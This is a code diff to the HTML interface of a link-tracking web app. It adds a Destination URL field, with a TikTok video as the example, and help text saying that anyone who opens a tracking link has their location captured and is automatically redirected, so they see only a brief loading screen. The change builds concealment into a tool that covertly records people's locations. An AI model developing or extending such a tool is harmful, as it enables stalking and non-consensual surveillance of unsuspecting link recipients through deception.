@@ -137,6 +137,7 @@
         <tr>
           <th>Name</th>
           <th>Tracking URL</th>
+          <th>Destination</th>
           <th>Hits</th>
           <th>Created</th>
           <th>Actions</th>
@@ -186,14 +187,24 @@
           type="text"
           id="linkName"
           class="form-control"
-          placeholder="e.g. Friend Survey, Job Application…"
+          placeholder="e.g. TikTok Video, Friend Survey…"
           maxlength="60"
+          autocomplete="off"
+        />
+      </div>
+      <div class="form-group">
+        <label for="destinationUrl">Destination URL <span style="color:var(--accent-red)">*</span></label>
+        <input
+          type="url"
+          id="destinationUrl"
+          class="form-control"
+          placeholder="https://www.tiktok.com/@user/video/123…"
           autocomplete="off"
         />
       </div>
       <p style="font-size:0.8rem;color:var(--text-muted);margin-top:-0.5rem;">
         <i class="fas fa-info-circle"></i>
-        A unique tracking URL will be generated. Share it with anyone — when they open it, their location is captured.
+        When someone opens your tracking link, their location is captured and they are <strong style="color:var(--text-secondary)">automatically redirected</strong> to the destination URL — they only see a brief loading screen.
       </p>
     </div>
     <div class="modal-footer">
